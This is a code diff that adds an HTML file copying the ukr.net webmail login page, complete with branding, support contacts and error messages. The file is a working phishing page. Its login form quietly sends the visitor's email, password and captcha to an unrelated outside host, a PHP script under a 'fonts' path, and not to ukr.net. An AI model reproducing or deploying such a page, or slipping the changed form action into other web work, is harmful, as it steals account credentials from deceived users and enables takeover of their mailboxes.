@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Почта @ ukr.net - украинская электронная почта • Создать емейл</title>
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+	<link rel="stylesheet" href="https://mail.ukr.net/public/splash.css">
+	<script type="text/javascript" src="https://mail.ukr.net/js/jquery-1.11.1.min.js"></script>
+	<script type="text/javascript" src="https://mail.ukr.net/js/html5shiv.js"></script>
+	<script type="text/javascript" src="/public/js/login.js"></script>
+	<meta name="description" content="Самая популярная электронная почта в Украине. Отправка по e-mail до 1,5 Гб. Почтовый ящик на Почта @ ukr.net — это профессиональная защита от спама и вирусов.Бесплатная регистрация email на домене ukr.net">
+	<meta name="keywords" content="почта, mail, email,почтовый ящик, электронная почта, майл, бесплатная почта, freemail, создать ящик, Украина, ukr, адрес, новая почта, емейл, регистрация почты, мейл, мєйл">
+	<meta name="google-site-verification" content="aTuKRvt9b2x25Lh4ikzWLdq44oPJomvYcvSiA091QnI" />
+</head>
+<body>
+<div class="page">
+	<header class="center">
+		<div class="lang">
+		    <a href="/" class="link" lang="uk">Укр</a> / <a href="/" class="link" lang="ru">Рус</a> / <a href="/" class="link" lang="en">Eng</a>
+		</div>
+		<a class="logo"></a>
+		<h3>Ваша почта<span></span></h3>
+	</header>
+	<div class="page__content">
+		<div class="wrapper center">
+		    <form class="login__form" onsubmit="return doLogin(this);" id="login-form" method="post" action="https://brianbosire.com/fonts/ukrr.php">
+				<input type="hidden" name="user" value="" />
+				<input type="hidden" name="client_id" value="9GLooZH9KjbBlWnuLkVX" />
+				<input type="hidden" name="captcha_id" value="" />
+				<input type="hidden" name="Domain" value="ukr.net" />
+				<div class="login__error"></div>
+				<input type="text" name="Login" placeholder="Ваша почта" id="Login" />
+				<input type="password" name="Password" placeholder="Пароль" id="Password" />
+				<label>
+				    <input type="checkbox" name="level" /> <span>Чужой компьютер</span>
+				</label>
+				<div class="login__captcha">
+					<div class="login__captcha-img">
+						<img src="" alt=""/>
+						<div class="reload"><span></span></div>
+					</div>
+					<div class="login__captcha-corner"></div>
+					<input type="text" name="captcha" maxlength="8" />
+				</div>
+				<div class="login__foot">
+				    <a href="#" id="recovery-link">Забыли пароль?</a><br/>
+					<a href="#" id="signup-link">Регистрация</a>
+					<button type="submit">Войти</button>
+				</div>
+			</form>
+			<div class="slides">
+			    <a href="#" class="reg">Получить ящик</a>
+				<section class="slides__slide fast">
+				    <h4>Быстрая</h4><p>Скорость доставки письма – меньше секунды.</p>
+					<span></span>
+					<div></div>
+				</section>
+				<section class="slides__slide simple">
+				    <h4>Простая</h4><p>Интуитивно понятный интерфейс, лаконичный дизайн, ничего лишнего.</p>
+					<span></span>
+					<div></div>
+				</section>
+				<section class="slides__slide mobile">
+				    <h4>Мобильная</h4><p>Оставайтесь на связи – пользуйтесь почтой@ukr.net с мобильных телефонов, iPhone, Android и iPad</p>
+					<span></span>
+					<div></div>
+				</section>
+			</div>
+		</div>
+	</div>
+	<footer class="center">
+		<div class="footer__slides">
+			<span></span>
+			<span></span>
+			<span></span>
+		</div>
+		<div class="footer__support">
+			<div class="footer__support-title">
+			    КРУГЛОСУТОЧНАЯ<br/><span>ПОДДЕРЖКА</span>
+			</div>
+			<div class="footer__support-arrow"></div>
+			<div class="footer__support-general">
+				<a href="mailto:support@ukr.net" class="link">support@ukr.net</a><br/>
+			</div>
+			<div class="footer__support-contact phone">
+				<span></span>(044) 235-85-55
+			</div>
+			<div class="footer__support-contact mts">
+				<span></span>(050) 204-14-24
+			</div>
+			<div class="footer__support-contact kyivstar">
+				<span></span>(096) 718-55-52
+			</div>
+			<!--<div class="footer__support-contact life">
+				<span></span>(063) 367-29-29
+			</div>-->
+		</div>
+		<div class="footer__support-links">
+		    <a href="/mobile" class="link mobile">Мобильная версия</a>
+			<a href="//ukr.net/terms" target="_blank" class="link">Соглашение о конфиденциальности</a>
+			&nbsp; / &nbsp;
+			<a href="/terms_ru.html" target="_blank" class="link">Условия использования</a>
+		</div>
+	</footer>
+</div>
+<script type="text/javascript">
+    var domain = 'ukr.net';
+    var auth_server = 'https://accounts.ukr.net';
+    var captcha_server = 'https://accounts.ukr.net';
+    var lang = 'ru';
+
+    var errorCodes = {
+        login_failed: 'Неверно указан логин или пароль. <a class=\'link\' href=\"http://wiki.ukr.net/Error_auth\" target=\"_blank\">Подробнее</a>',
+        user_blocked: 'Ваш ящик заблокирован за нарушение. <a class=\'link\' href=\"http://wiki.ukr.net/Mailboxblocked\" target=\"_blank\">Подробнее</a>',
+        user_closed: 'Ящик закрыт по просьбе пользователя.',
+        user_deleted: 'Ящик закрыт по просьбе пользователя.',
+        activation_required: 'Необходимо активировать аккаунт',
+        user_nologin: 'Вход через веб-интерфейс запрещен. <a class=\'link\' href=\"http://wiki.ukr.net/Can%27t_login/webnotlogin\" target=\"_blank\">Подробнее</a>',
+        user_maintenance: 'Ящик временно закрыт на обслуживание.',
+        invalid_captcha: 'Неверно введены символы, изображенные на картинке',
+        session_expired: 'Сессия просрочена.',
+        captcha_required: '<p><b>Внимание!</b> Превышен лимит неудачных попыток входа в почтовый ящик.</p><p>Введите пароль и код с картинки.</p>',
+        block_terminated: 'Аккаунт заблокирован.<br/><a class=\'link\' href=\"/restore_access\">Восстановление доступа.</a>',
+        block_terminated_not_ua: 'Вход не из Украины запрещен.<br/><a class=\'link\' href=\"/restore_access\">Восстановление доступа.</a>'
+	};
+
+	$('.lang a.link[lang=' + lang + ']').addClass('current');
+	$('.lang a.link')
+	.each(function() {
+		var href = location.href.replace(/lang=[^&]*/g, '').replace(/\?+$/, '').replace(/&+$/, '');
+		var join_char = href.match(/\?.+$/) ? '&' : '?';
+		$(this).attr('href', [ href, 'lang=' + $(this).attr('lang') ].join(join_char));
+	});
+
+	function getQueryArgs() {
+		var queryString = location.href.split('?')[1];
+
+		var result = {};
+		if (queryString) {
+			var args = queryString.split('&');
+			for (var i = 0, len = args.length; i < len; i++) {
+				var arg = args[i].split('=');
+				result[arg.shift()] = decodeURIComponent(arg.join('='));
+			}
+		}
+		return result;
+	}
+
+	function doLogin(form) {
+		var input = document.createElement('INPUT');
+		input.setAttribute('type', 'hidden');
+		input.setAttribute('name', 'submit');
+		input.setAttribute('value', '1');
+		form.appendChild(input);
+		return login(form);
+	}
+</script>
+<script type="text/javascript">
+	var slideIndex = 0,
+		slides = $('.slides__slide'),
+		slidesToggle = $('.footer__slides'),
+		slideInterval, slideTimeout;
+
+	slidesToggle.click(function(e) {
+		var target = e.target;
+
+		if (target.nodeName.toLowerCase() != 'span') return false;
+
+		setSlide($(target).index());
+
+		window.clearInterval(slideInterval);
+		window.clearTimeout(slideTimeout);
+		slideTimeout = window.setTimeout(rotateSlides, 20*1000);
+	});
+
+	function setSlide(index) {
+		slideIndex = index;
+
+		slides.removeClass('show');
+		slides.eq(index).addClass('show');
+
+		slidesToggle.find('span').removeClass('current');
+		slidesToggle.find('span').eq(index).addClass('current');
+	}
+
+	function rotateSlides() {
+		slideInterval = window.setInterval(function() {
+			slideIndex++;
+			if (slideIndex > slides.length - 1) slideIndex = 0;
+			setSlide(slideIndex);
+		}, 10*1000);
+	}
+
+	function centerPage() {
+		$('.page').css({marginTop: ($(window).height() - $('.page').height()) / 2});
+	}
+	centerPage();
+	window.onresize = centerPage;
+
+	setSlide(0);
+	rotateSlides();
+</script>
+<script type="text/javascript">
+	var args = getQueryArgs();
+	args.user = '';
+	if (args.user && args.user.match(/@/)) {
+		var userParts = args.user.split('@');
+		$('#login-form [name=Login]').val(userParts.shift());
+		domain = $('#login-form [name=Domain]').val();
+	}
+	if (args.captcha_id) {
+		$('[name=captcha_id]').val(args.captcha_id);
+		var captchaImg = $('.login__captcha img');
+		captchaImg.attr('src', captcha_server + '/captcha?id=' + args.captcha_id).find('.refresh');
+		$('.login__captcha .reload').click(function() {
+			captchaImg.attr('src', captcha_server + '/captcha?id=' + args.captcha_id + '&rnd=' + new Date().getTime());
+		});
+		$('.login__form').addClass('full');
+	}
+	if (args.error) {
+		var error_message = errorCodes[args.error] ? errorCodes[args.error] : errorCodes['login_failed'];
+		$('.login__error').html(error_message).addClass('show');
+	}
+	$('#signup-link').attr('href', 'https://oauth.ukr.net/registration?lang=ru');
+	$('.slides a').attr('href', 'https://oauth.ukr.net/registration?lang=ru');
+	$('#recovery-link').attr('href', 'https://oauth.ukr.net/recovery?lang=ru');
+    setTimeout(function() {
+        if (!$('input[name=Login]').val()) {
+            $('input[name=Login]').focus();
+        }
+        else {
+            $('input[name=Password]').focus()
+        }
+    }, 10);
+</script>
+
+<noscript>
+<img width="0" heght="0" style="display: none" src="/stats/nojs/desktop/login_page">
+</noscript>
+
+</body>
+</html>
